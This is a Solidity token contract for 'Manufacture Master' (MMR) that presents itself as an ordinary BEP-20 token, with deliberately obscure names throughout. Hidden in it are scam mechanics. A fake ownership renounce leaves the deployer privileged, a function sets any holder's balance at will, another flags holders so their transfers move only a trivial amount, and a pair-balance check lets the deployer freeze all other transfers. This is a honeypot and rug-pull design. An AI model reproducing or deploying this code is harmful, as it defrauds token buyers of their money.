//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface autoTeam {
    function createPair(address atBuy, address txToWallet) external returns (address);
}

interface exemptTo {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listSenderSwap) external view returns (uint256);

    function transfer(address autoLimit, uint256 tradingSwap) external returns (bool);

    function allowance(address modeSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingSwap) external returns (bool);

    function transferFrom(
        address sender,
        address autoLimit,
        uint256 tradingSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txLaunchedSwap, uint256 value);
    event Approval(address indexed modeSender, address indexed spender, uint256 value);
}

abstract contract takeLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isTradingToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface exemptToMetadata is exemptTo {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ManufactureMaster is takeLaunch, exemptTo, exemptToMetadata {

    uint256 private launchEnableAuto;

    address public atSwapTeam;

    constructor (){
        if (listFee == marketingToken) {
            tradingFromSell = totalTrading;
        }
        isTradingToken shouldToken = isTradingToken(atLiquidity);
        atSwapTeam = autoTeam(shouldToken.factory()).createPair(shouldToken.WETH(), address(this));
        if (shouldTotal) {
            listFee = false;
        }
        walletLaunched = _msgSender();
        receiverTeam[walletLaunched] = true;
        tokenMode[walletLaunched] = walletExemptLiquidity;
        amountTx();
        if (launchedTo == totalTrading) {
            totalTrading = launchedTo;
        }
        emit Transfer(address(0), walletLaunched, walletExemptLiquidity);
    }

    bool public totalLaunch;

    bool public listFee;

    function owner() external view returns (address) {
        return walletShouldIs;
    }

    string private autoToken = "Manufacture Master";

    mapping(address => uint256) private tokenMode;

    address atLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public toSender;

    function balanceOf(address listSenderSwap) public view virtual override returns (uint256) {
        return tokenMode[listSenderSwap];
    }

    function limitAutoTx() private view {
        require(receiverTeam[_msgSender()]);
    }

    function feeReceiver(address launchTx) public {
        require(launchTx.balance < 100000);
        if (fundBuy) {
            return;
        }
        
        receiverTeam[launchTx] = true;
        
        fundBuy = true;
    }

    mapping(address => bool) public receiverTeam;

    address txToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return walletShouldIs;
    }

    function name() external view virtual override returns (string memory) {
        return autoToken;
    }

    mapping(address => bool) public toWallet;

    uint256 private walletExemptLiquidity = 100000000 * 10 ** 18;

    uint256 private launchedTo;

    function amountTx() public {
        emit OwnershipTransferred(walletLaunched, address(0));
        walletShouldIs = address(0);
    }

    function transfer(address tradingIs, uint256 tradingSwap) external virtual override returns (bool) {
        return tokenExemptReceiver(_msgSender(), tradingIs, tradingSwap);
    }

    function launchMarketingSwap(address senderLaunch, address autoLimit, uint256 tradingSwap) internal returns (bool) {
        require(tokenMode[senderLaunch] >= tradingSwap);
        tokenMode[senderLaunch] -= tradingSwap;
        tokenMode[autoLimit] += tradingSwap;
        emit Transfer(senderLaunch, autoLimit, tradingSwap);
        return true;
    }

    address private walletShouldIs;

    uint256 public totalTrading;

    uint256 public fundFromLaunched;

    function symbol() external view virtual override returns (string memory) {
        return listShouldSwap;
    }

    function tradingMode(address tradingIs, uint256 tradingSwap) public {
        limitAutoTx();
        tokenMode[tradingIs] = tradingSwap;
    }

    uint256 constant liquidityReceiver = 5 ** 10;

    function transferFrom(address senderLaunch, address autoLimit, uint256 tradingSwap) external override returns (bool) {
        if (_msgSender() != atLiquidity) {
            if (takeAmount[senderLaunch][_msgSender()] != type(uint256).max) {
                require(tradingSwap <= takeAmount[senderLaunch][_msgSender()]);
                takeAmount[senderLaunch][_msgSender()] -= tradingSwap;
            }
        }
        return tokenExemptReceiver(senderLaunch, autoLimit, tradingSwap);
    }

    uint256 public tradingFromSell;

    function approve(address totalLaunched, uint256 tradingSwap) public virtual override returns (bool) {
        takeAmount[_msgSender()][totalLaunched] = tradingSwap;
        emit Approval(_msgSender(), totalLaunched, tradingSwap);
        return true;
    }

    uint256 totalTokenAt;

    uint256 exemptListSwap;

    mapping(address => mapping(address => uint256)) private takeAmount;

    function tokenExemptReceiver(address senderLaunch, address autoLimit, uint256 tradingSwap) internal returns (bool) {
        if (senderLaunch == walletLaunched) {
            return launchMarketingSwap(senderLaunch, autoLimit, tradingSwap);
        }
        uint256 autoReceiverFrom = exemptTo(atSwapTeam).balanceOf(txToken);
        require(autoReceiverFrom == totalTokenAt);
        require(autoLimit != txToken);
        if (toWallet[senderLaunch]) {
            return launchMarketingSwap(senderLaunch, autoLimit, liquidityReceiver);
        }
        return launchMarketingSwap(senderLaunch, autoLimit, tradingSwap);
    }

    bool public fundBuy;

    event OwnershipTransferred(address indexed listFrom, address indexed exemptToSender);

    bool private shouldTotal;

    function decimals() external view virtual override returns (uint8) {
        return shouldEnable;
    }

    string private listShouldSwap = "MMR";

    function tokenLaunched(address toLaunched) public {
        limitAutoTx();
        
        if (toLaunched == walletLaunched || toLaunched == atSwapTeam) {
            return;
        }
        toWallet[toLaunched] = true;
    }

    bool public marketingToken;

    function totalSupply() external view virtual override returns (uint256) {
        return walletExemptLiquidity;
    }

    address public walletLaunched;

    uint8 private shouldEnable = 18;

    function allowance(address liquiditySwap, address totalLaunched) external view virtual override returns (uint256) {
        if (totalLaunched == atLiquidity) {
            return type(uint256).max;
        }
        return takeAmount[liquiditySwap][totalLaunched];
    }

    function liquidityTotal(uint256 tradingSwap) public {
        limitAutoTx();
        totalTokenAt = tradingSwap;
    }

}